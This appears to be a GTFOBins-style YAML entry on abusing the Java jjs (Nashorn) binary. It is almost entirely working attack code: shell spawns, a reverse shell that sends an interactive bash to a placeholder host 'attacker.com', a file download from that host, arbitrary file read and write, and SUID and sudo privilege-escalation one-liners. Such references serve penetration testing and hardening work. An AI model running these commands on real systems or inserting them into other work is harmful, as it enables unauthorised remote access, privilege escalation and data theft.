---
description: This tool is installed starting with Java SE 8.
functions:
  shell:
    - code: echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        echo 'var host=Java.type("java.lang.System").getenv("RHOST");
        var port=Java.type("java.lang.System").getenv("RPORT");
        var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
        var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
        var Socket = Java.type("java.net.Socket");
        var s=new Socket(host,port);
        var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        echo "var URL = Java.type('java.net.URL');
        var ws = new URL('$URL');
        var Channels = Java.type('java.nio.channels.Channels');
        var rbc = Channels.newChannel(ws.openStream());
        var FileOutputStream = Java.type('java.io.FileOutputStream');
        var fos = new FileOutputStream('$LFILE');
        fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
        fos.close();
        rbc.close();" | jjs
  file-write:
    - code: |
        echo 'var FileWriter = Java.type("java.io.FileWriter");
        var fw=new FileWriter("./file_to_write");
        fw.write("DATA");
        fw.close();' | jjs
  file-read:
    - code: |
        echo 'var BufferedReader = Java.type("java.io.BufferedReader");
        var FileReader = Java.type("java.io.FileReader");
        var br = new BufferedReader(new FileReader("file_to_read"));
        while ((line = br.readLine()) != null) { print(line); }' | jjs
  suid:
    - description: This has been found working in macOS but failing on Linux systems.
      code: echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
  sudo:
    - code: echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
---
